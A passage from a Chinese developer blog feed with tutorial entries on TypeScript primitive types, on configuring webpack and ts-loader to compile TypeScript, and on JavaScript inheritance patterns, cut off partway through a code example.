undefined注解，初始化后只能赋值其本身</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="attr">u</span>: <span class="literal">undefined</span> = <span class="literal">undefined</span></span><br><span class="line"><span class="keyword">let</span> <span class="attr">n</span>: <span class="literal">null</span> = <span class="literal">null</span></span><br></pre></td></tr></table></figure><p>2.可以将undefined和null 赋值给所有类型</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="attr">num</span>: number = u</span><br><span class="line">num = n</span><br></pre></td></tr></table></figure><p>在们在 tsconfig.js 文件中设置 为严格模式下，则不能将undefined和void 赋值给自身和void以外的变量了</p><h4 id="7-参考"><a href="#7-参考" class="headerlink" title="7. 参考"></a>7. 参考</h4><p><a href="https://ts.xcatliu.com/basics/primitive-data-types.html">原始数据类型</a></p>]]></content>
      
      
      <categories>
          
          <category> ts </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ts基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ts运行环境配置</title>
      <link href="/2020/09/05/ts%E8%BF%90%E8%A1%8C%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
      <url>/2020/09/05/ts%E8%BF%90%E8%A1%8C%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<p>最近简单学习了一下ts发现还真有点香，借双休总结回顾一下，先来回顾搭建一个可以运行ts文件的环境，这样后面编译ts就方便了</p><h3 id="1-安装typescript"><a href="#1-安装typescript" class="headerlink" title="1 安装typescript"></a>1 安装typescript</h3><h4 id="1-1-在拥有node的系统环境通过npm安装typescript"><a href="#1-1-在拥有node的系统环境通过npm安装typescript" class="headerlink" title="1.1 在拥有node的系统环境通过npm安装typescript"></a>1.1 在拥有node的系统环境通过npm安装typescript</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">npm install typescript -g</span><br></pre></td></tr></table></figure><h4 id="1-2-查看版本检查是否安装成功"><a href="#1-2-查看版本检查是否安装成功" class="headerlink" title="1.2 查看版本检查是否安装成功"></a>1.2 查看版本检查是否安装成功</h4>  <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">tsc --version</span><br></pre></td></tr></table></figure><h4 id="安装成功后就可以通过指令编译ts文件了-会在目录生成对应js文件"><a href="#安装成功后就可以通过指令编译ts文件了-会在目录生成对应js文件" class="headerlink" title="安装成功后就可以通过指令编译ts文件了,会在目录生成对应js文件"></a>安装成功后就可以通过指令编译ts文件了,会在目录生成对应js文件</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">tsc main.<span class="property">ts</span></span><br></pre></td></tr></table></figure><p>感觉老是这样通过指令编译感觉很麻烦，那可以通过webpack配置对应的loader编译ts文件</p><h3 id="2-配置webpack-编译ts"><a href="#2-配置webpack-编译ts" class="headerlink" title="2 配置webpack 编译ts"></a>2 配置webpack 编译ts</h3><h4 id="2-1-创建项目目录"><a href="#2-1-创建项目目录" class="headerlink" title="2.1 创建项目目录"></a>2.1 创建项目目录</h4><blockquote><p>目录结构</p><blockquote><ul><li>src &#x2F;&#x2F;存放源文件<blockquote><p>– main.ts</p></blockquote></li><li>build &#x2F;&#x2F; 存放webpack配置文件<blockquote><p>– webpack.config.js</p></blockquote></li><li>index.html &#x2F;&#x2F; 入口页面</li></ul></blockquote></blockquote><span id="more"></span><h4 id="2-2-初始化npm"><a href="#2-2-初始化npm" class="headerlink" title="2.2 初始化npm"></a>2.2 初始化npm</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">npm init</span><br></pre></td></tr></table></figure><h4 id="2-3-在项目中安装typescript"><a href="#2-3-在项目中安装typescript" class="headerlink" title="2.3 在项目中安装typescript"></a>2.3 在项目中安装typescript</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">npm -i typescript</span><br></pre></td></tr></table></figure><h4 id="2-4-初始化tsconfig-json文件"><a href="#2-4-初始化tsconfig-json文件" class="headerlink" title="2.4 初始化tsconfig.json文件"></a>2.4 初始化tsconfig.json文件</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">tsc --init  <span class="comment">// 自动在根目录生成tsconfig.json并初始化配置文件</span></span><br></pre></td></tr></table></figure><p>在配置文件中的lib可以加载额外的模块</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;lib&quot;</span>: [<span class="string">&quot;es6&quot;</span>, <span class="string">&quot;dom&quot;</span>],  </span><br></pre></td></tr></table></figure><h4 id="2-5-安装并配置tslint来约束代码"><a href="#2-5-安装并配置tslint来约束代码" class="headerlink" title="2.5 安装并配置tslint来约束代码"></a>2.5 安装并配置tslint来约束代码</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">npm i tslint -g; tslint -i</span><br></pre></td></tr></table></figure><h4 id="2-6-安装webpack相关插件"><a href="#2-6-安装webpack相关插件" class="headerlink" title="2.6 安装webpack相关插件"></a>2.6 安装webpack相关插件</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">npm install webpack webpack-cli webpack-dev-server -D</span><br></pre></td></tr></table></figure><h4 id="2-7-在package-json-里配置启动脚本"><a href="#2-7-在package-json-里配置启动脚本" class="headerlink" title="2.7 在package.json 里配置启动脚本"></a>2.7 在package.json 里配置启动脚本</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;serve&quot;</span>: <span class="string">&quot;cross-env NODE_ENV=development webpack-dev-server --mode=development --config build/webpack.config.js&quot;</span></span><br></pre></td></tr></table></figure><h4 id="2-8-安装-cross-env-判断当前是开发环境还是生产环境"><a href="#2-8-安装-cross-env-判断当前是开发环境还是生产环境" class="headerlink" title="2.8 安装 cross-env 判断当前是开发环境还是生产环境"></a>2.8 安装 cross-env 判断当前是开发环境还是生产环境</h4><p>安装cross-env</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">npm install cross-env -D</span><br></pre></td></tr></table></figure><p>在webpack配置文件中判断环境</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="attr">devtool</span>: process.<span class="property">env</span>.<span class="property">NODE_ENV</span> === <span class="string">&quot;production&quot;</span> ? <span class="literal">false</span> : <span class="string">&quot;inline-source-map&quot;</span>,</span><br></pre></td></tr></table></figure><h4 id="2-9-安装webpack-loader-ts-loader-来解析-ts文件"><a href="#2-9-安装webpack-loader-ts-loader-来解析-ts文件" class="headerlink" title="2.9 安装webpack loader: ts-loader 来解析 .ts文件"></a>2.9 安装webpack loader: ts-loader 来解析 .ts文件</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">npm install ts-loader -D</span><br></pre></td></tr></table></figure><p>在配置文件中配置rule来解析 .ts文件</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="attr">rules</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">test</span>: <span class="regexp">/\.tsx?$/</span>,</span><br><span class="line">      <span class="attr">use</span>: <span class="string">&quot;ts-loader&quot;</span>,</span><br><span class="line">      <span class="attr">exclude</span>: <span class="regexp">/node_modules/</span></span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br></pre></td></tr></table></figure><h4 id="2-10-安装-html-webpack-plugin-来配置入口视图"><a href="#2-10-安装-html-webpack-plugin-来配置入口视图" class="headerlink" title="2.10 安装 html-webpack-plugin 来配置入口视图"></a>2.10 安装 html-webpack-plugin 来配置入口视图</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">npm install html-webpack-plugin -D</span><br></pre></td></tr></table></figure><p>webpack配置插件</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="attr">plugins</span>: [</span><br><span class="line">  <span class="keyword">new</span> <span class="title class_">HtmlWebpackPlugin</span>(&#123;</span><br><span class="line">    <span class="attr">template</span>: <span class="string">&quot;./index.html&quot;</span></span><br><span class="line">  &#125;)</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h4 id="2-11-在build文件夹中webpack-config-js-来配置webpack完整配置"><a href="#2-11-在build文件夹中webpack-config-js-来配置webpack完整配置" class="headerlink" title="2.11 在build文件夹中webpack.config.js 来配置webpack完整配置"></a>2.11 在build文件夹中webpack.config.js 来配置webpack完整配置</h4><h4 id="2-12-在src文件夹中main-ts-编写代码或导入模块"><a href="#2-12-在src文件夹中main-ts-编写代码或导入模块" class="headerlink" title="2.12 在src文件夹中main.ts 编写代码或导入模块"></a>2.12 在src文件夹中main.ts 编写代码或导入模块</h4><h4 id="2-13-启动项目"><a href="#2-13-启动项目" class="headerlink" title="2.13 启动项目"></a>2.13 启动项目</h4><p>启动项目，打开地址，和控制台就可以看到ts编译后运行的结果了<br>而不用一个一个文件通过指令编译了</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">npm run serve</span><br></pre></td></tr></table></figure><h3 id="完整目录"><a href="#完整目录" class="headerlink" title="完整目录"></a>完整目录</h3><p>目录路径：<br><img src="https://cdn.jsdelivr.net/gh/bitjian/blogImg/2020/09/dirname.png" alt="目录路径"></p><h3 id="完整webpack配置"><a href="#完整webpack配置" class="headerlink" title="完整webpack配置"></a>完整webpack配置</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">const</span> <span class="title class_">HtmlWebpackPlugin</span> = <span class="built_in">require</span>(<span class="string">&quot;html-webpack-plugin&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="attr">entry</span>: <span class="string">&quot;./src/main.ts&quot;</span>,</span><br><span class="line">  <span class="attr">output</span>: &#123;</span><br><span class="line">    <span class="attr">filename</span>: <span class="string">&quot;build.js&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">resolve</span>: &#123;</span><br><span class="line">    <span class="attr">extensions</span>: [<span class="string">&quot;.tsx&quot;</span>, <span class="string">&quot;.ts&quot;</span>, <span class="string">&quot;.js&quot;</span>]</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">module</span>: &#123;</span><br><span class="line">    <span class="attr">rules</span>: [</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">test</span>: <span class="regexp">/\.tsx?$/</span>,</span><br><span class="line">        <span class="attr">use</span>: <span class="string">&quot;ts-loader&quot;</span>,</span><br><span class="line">        <span class="attr">exclude</span>: <span class="regexp">/node_modules/</span></span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">devtool</span>: process.<span class="property">env</span>.<span class="property">NODE_ENV</span> === <span class="string">&quot;production&quot;</span> ? <span class="literal">false</span> : <span class="string">&quot;inline-source-map&quot;</span>,</span><br><span class="line">  <span class="attr">devServer</span>: &#123;</span><br><span class="line">    <span class="attr">contentBase</span>: <span class="string">&quot;./dist&quot;</span>,</span><br><span class="line">    <span class="attr">stats</span>: <span class="string">&quot;errors-only&quot;</span>,</span><br><span class="line">    <span class="attr">compress</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">host</span>: <span class="string">&quot;localhost&quot;</span>,</span><br><span class="line">    <span class="attr">port</span>: <span class="number">8888</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">plugins</span>: [</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">HtmlWebpackPlugin</span>(&#123;</span><br><span class="line">      <span class="attr">template</span>: <span class="string">&quot;./index.html&quot;</span></span><br><span class="line">    &#125;)</span><br><span class="line">  ]</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://mp.weixin.qq.com/s/wnL1l-ERjTDykWM76l4Ajw">TypeScript(二)使用Webpack搭建环境</a> </p>]]></content>
      
      
      <categories>
          
          <category> ts </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ts基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>js继承</title>
      <link href="/2020/06/13/js%E7%BB%A7%E6%89%BF/"/>
      <url>/2020/06/13/js%E7%BB%A7%E6%89%BF/</url>
      
        <content type="html"><![CDATA[<h3 id="js继承"><a href="#js继承" class="headerlink" title="js继承"></a>js继承</h3><p>  又到了双休，但是手机老是给我提示暴雨预警，哪都不敢去。所以借着这个时机来复习一下js基础中的继承，顺便总结一下中间踩到的坑，每个实例的代码都全部写下来，虽然有很多是重复的但是这样方便查看和理解，如有错误欢迎指点^_^</p><h4 id="原型链继承"><a href="#原型链继承" class="headerlink" title="原型链继承"></a>原型链继承</h4><p>原型链继承，就是让子类的原型属性指向父类的实例，这样子类没有在自己的实例里找到属性就会去原型上找（此时是父类的实例），再没有找到就去父类原型上找</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建父类</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Super</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">supArr</span> = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>]</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">name</span> = <span class="string">&#x27;super&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 为父类原型添加方法</span></span><br><span class="line"><span class="title class_">Super</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">sayName</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">name</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 创建子类</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Sub</span>(<span class="params"></span>) &#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 注意：为子类原型添加方法, 改变子类原型对象后获取不到此方法 ×</span></span><br><span class="line"><span class="title class_">Sub</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">saySubName1</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;saySubName1&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 将子类的原型对象指向父类实例</span></span><br><span class="line"><span class="title class_">Sub</span>.<span class="property"><span class="keyword">prototype</span></span> = <span class="keyword">new</span> <span class="title class_">Super</span>()</span><br><span class="line"><span class="comment">// 改变子类原型后，为子类原型添加方法 √</span></span><br><span class="line"><span class="title class_">Sub</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">saySubName2</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;saySubName2&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">Sub</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">sayArr</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">supArr</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建子类实例</span></span><br><span class="line"><span class="keyword">let</span> sub1 = <span class="keyword">new</span> <span class="title class_">Sub</span>()</span><br><span class="line"><span class="keyword">let</span> sub2 = <span class="keyword">new</span> <span class="title class_">Sub</span>()</span><br><span class="line"></span><br><span class="line">sub1.<span class="property">name</span> =<span class="string">&#x27;aaa&#x27;</span></span><br><span class="line">sub2.<span class="property">name</span> = <span class="string">&#x27;bbb&#x27;</span></span><br><span class="line">sub1.<span class="title function_">sayName</span>() <span class="comment">// aaa</span></span><br><span class="line">sub2.<span class="title function_">sayName</span>() <span class="comment">// bbb</span></span><br><span class="line">sub1.<span class="property">supArr</span>.<span class="title function_">push</span>(<span class="string">&#x27;c&#x27;</span>) </span><br><span class="line">sub2.<span class="title function_">sayArr</span>() <span class="comment">// [&#x27;a&#x27;, &#x27;b&#x27;] -&gt; [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;]</span></span><br></pre></td></tr></table></figure><p>使用原型链继承，可以帮助我们更加深刻的理解原型，但是也有很多缺点<br>缺点，1.修改父类引用类型，所有子类实例都会受到影响<br>2.不能实现多继承 3.不能向父类构造函数传参</p><span id="more"></span><h4 id="构造函数继承"><a href="#构造函数继承" class="headerlink" title="构造函数继承"></a>构造函数继承</h4><p>构造函数继承就是在子类的构造函数中通过call或apply方法，调用父类构造函数</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Super</span>(<span class="params">name</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">name</span> = name</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">supArr</span> = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>]</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 为父类原型添加方法,通过构造函数继承，子类并不能获取到父类的原型</span></span><br><span class="line"><span class="comment">// Super.prototype.sayName = function() &#123;</span></span><br><span class="line"><span class="comment">//   console.log(this.name)</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"><span class="comment">// Super.prototype.sayArr = function() &#123;</span></span><br><span class="line"><span class="comment">//   console.log(this.supArr)</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"><span class="comment">// 通过 call 或者 apply 调用父类构造函数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Sub</span>(<span class="params">name</span>) &#123;</span><br><span class="line">    <span class="title class_">Super</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>, name)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">Sub</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">sayName</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">name</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">Sub</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">sayArr</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">supArr</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> sub1 = <span class="keyword">new</span> <span class="title class_">Sub</span>(<span class="string">&#x27;zzj&#x27;</span>)</span><br><span class="line"><span class="keyword">let</span> sub2 = <span class="keyword">new</span> <span class="title class_">Sub</span>(<span class="string">&#x27;sjj&#x27;</span>)</span><br><span class="line">sub1.<span class="title function_">sayName</span>() <span class="comment">// zzj</span></span><br><span class="line">sub2.<span class="title function_">sayName</span>() <span class="comment">// sjj</span></span><br><span class="line"><span class="comment">// 在 sub1里push c</span></span><br><span class="line">sub1.<span class="property">supArr</span>.<span class="title function_">push</span>(<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line"><span class="comment">// sub2里的arr不会受到影响</span></span><br><span class="line">sub2.<span class="title function_">sayArr</span>() <span class="comment">// [&#x27;a&#x27;, &#x27;b&#x27;]</span></span><br></pre></td></tr></table></figure><p>在这里本能的去父类原型上写方法，但是在调用的时候并获取不到父类的方法，<br>这是因为在子类通过call调用父类构造函数时，只是拷贝了父类中实例的属性<br>优点：1.可以向父类构造函数传参， 2. 引用类型不会受到其他实例的影响<br>缺点：1. 定义的方法不能复用，每个实例都会重新定义原型上的方法</p><h4 id="组合继承"><a href="#组合继承" class="headerlink" title="组合继承"></a>组合继承</h4><p>组合继承是结合原型链继承和构造函数继承，弥补了原型链继承不能传参和引用类型的改变会影响到其他实例，也弥补了构造函数继承只能在子类中定义方法，每个实例都会重新定义一次方法的缺点。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建父类</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Super</span>(<span class="params">name</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">supArr</span> = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>]</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">name</span> = name</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 为父类原型添加方法</span></span><br><span class="line"><span class="title class_">Super</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">sayName</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">name</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过 call 或者 apply 调用父类构造函数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Sub</span>(<span class="params">name</span>) &#123;</span><br><span class="line">  <span class="comment">// 第二次调用</span></span><br><span class="line">  <span class="title class_">Super</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>, name)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 将子类的原型对象指向父类实例</span></span><br><span class="line"><span class="comment">// 第一次调用</span></span><br><span class="line"><span class="title class_">Sub</span>.<span class="property"><span class="keyword">prototype</span></span> = <span class="keyword">new</span> <span class="title class_">Super</span>()</span><br><span class="line"><span class="title class_">Sub</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">sayArr</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">supArr</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> sub1 = <span class="keyword">new</span> <span class="title class_">Sub</span>(<span class="string">&#x27;zzj&#x27;</span>)</span><br><span class="line"><span class="keyword">let</span> sub2 = <span class="keyword">new</span> <span class="title class_">Sub</span>(<span class="string">&#x27;sjj&#x27;</span>)</span><br><span class="line">sub1.<span class="title function_">sayName</span>() <span class="comment">// zzj</span></span><br><span class="line">sub2.<span class="title function_">sayName</span>()  <span class="comment">// sjj</span></span><br><span class="line"><span class="comment">// 在 sub1里push c</span></span><br><span class="line">sub1.<span class="property">supArr</span>.<span class="title function_">push</span>(<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line"><span class="comment">// sub2里的arr不会受到影响</span></span><br><span class="line">sub2.<span class="title function_">sayArr</span>() <span class="comment">// [ &#x27;a&#x27;, &#x27;b&#x27; ]</span></span><br></pre></td></tr></table></figure><p>虽然弥补了缺陷，但是子类调用构造函数时通过call拷贝了父类上的实例属性，然后子类又通过原型指向了父类的实例，那么子类原型上又有了父类上的实例属性。<br>优点： 1.结合了 原型链继承 和构造函数继承，弥补了各自的缺陷<br>缺点： 调用了两次父类构造函数，导致子类实例和原型上都有父类实例上的属性</p><h4 id="原型式继承"><a href="#原型式继承" class="headerlink" title="原型式继承"></a>原型式继承</h4><p>原型式继承，就是基于已有对象，创建一个新对象和Object.create类似</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Object</span>(<span class="params">sup</span>) &#123;</span><br><span class="line">  <span class="comment">// 创建一个中间函数</span></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">Fn</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line">  <span class="comment">// 将函数的原型指向sup</span></span><br><span class="line">  <span class="title class_">Fn</span>.<span class="property"><span class="keyword">prototype</span></span> = sup</span><br><span class="line">  <span class="comment">// 返回函数的实例</span></span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Fn</span>()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> person = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;super&#x27;</span>,</span><br><span class="line">  <span class="attr">arr</span>: [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>],</span><br><span class="line">  <span class="title function_">sayName</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">name</span>)</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="title function_">sayArr</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">arr</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">let</span> newObj = <span class="title class_">Object</span>(person)</span><br><span class="line"><span class="keyword">let</span> newObj2 = <span class="title class_">Object</span>(person)</span><br><span class="line">newObj.<span class="property">name</span> = <span class="string">&#x27;newObj&#x27;</span></span><br><span class="line">newObj2.<span class="property">name</span> = <span class="string">&#x27;newObj2&#x27;</span></span><br><span class="line">newObj2.<span class="title function_">sayName</span>() <span class="comment">// newObj2</span></span><br><span class="line">newObj.<span class="title function_">sayName</span>() <span class="comment">// newObj</span></span><br><span class="line"><span class="comment">// 修改 newObj里的数组会影响到其他实例</span></span><br><span class="line">newObj.<span class="property">arr</span>.<span class="title function_">push</span>(<span class="string">&#x27;c&#x27;</span>) </span><br><span class="line">newObj2.<span class="title function_">sayArr</span>() <span class="comment">// [ &#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27; ]</span></span><br></pre></td></tr></table></figure><p>缺点和原型链继承一样</p><h4 id="寄生组合继承"><a href="#寄生组合继承" class="headerlink" title="寄生组合继承"></a>寄生组合继承</h4><p>结合上面三个，将子类的原型指向通过Object函数创建的中间函数的原型，因为中间函数没有实例属性，这样子类原型上就不会有父类属性，这句话看代码就理解啦。中间我产生了一个疑问为什么不直接让子类原型指向父类原型呢？</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 原型式函数,创建一个中间函数,让中间函数的原型指向父类原型</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">ObjectCreate</span>(<span class="params">sup</span>) &#123;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">Fn</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line">  <span class="title class_">Fn</span>.<span class="property"><span class="keyword">prototype</span></span> = sup.<span class="property"><span class="keyword">prototype</span></span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Fn</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 寄生函数,对子类操作的封装,主要是来弥补子类原型构造函数的缺失,和让子类构造函数指向中间函数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">inherit</span>(<span class="params">sub, sup</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> prototype = <span class="title class_">ObjectCreate</span>(sup); <span class="comment">// 创建对象</span></span><br><span class="line">  prototype.<span class="property">constructor</span> = sub; <span class="comment">// 增强对象</span></span><br><span class="line">  sub.<span class="property"><span class="keyword">prototype</span></span> = prototype; <span class="comment">// 指定对象</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 创建父类</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Super</span>(<span class="params">name</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">supArr</span> = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>]</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">name</span> = name</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 为父类原型添加方法</span></span><br><span class="line"><span class="title class_">Super</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">sayName</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">name</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过 call 或者 apply 调用父类构造函数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Sub</span>(<span class="params">name</span>) &#123;</span><br><span class="line">  <span class="title class_">Super</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>, name)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 注意：定义子类原型方法不能在 寄生组合继承操作之前， 因为子类的原型指向被改变了</span></span><br><span class="line"><span class="comment">// Sub.prototype.sayArr = function() &#123;</span></span><br><span class="line"><span class="comment">//   console.log(this.supArr)</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 将子类的原型对象指向父类实例</span></span><br><span class="line"><span class="comment">// Sub.prototype = new Super()</span></span><br><span class="line"><span class="comment">// 不采用上面的方法，采用寄生原型式</span></span><br><span class="line"><span class="title function_">inherit</span>(<span class="title class_">Sub</span>, <span class="title class_">Super</span>)</span><br><span class="line"><span class="comment">// 疑问？ 为什么不直接让子类原型直接指向父类原型呢</span></span><br><span class="line"><span class="comment">// 因为这样实例修改了或增加的原型上的属性，那么原型就改变了会影响到其他实例</span></span><br><span class="line"><span class="comment">// Sub.prototype = Super.prototype</span></span><br><span class="line"><span class="comment">// 定义子类原型方法应该在寄生组合继承操作之后</span></span><br><span class="line"><span class="title class_">Sub</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">sayArr</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">supArr</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> sub1 = <span 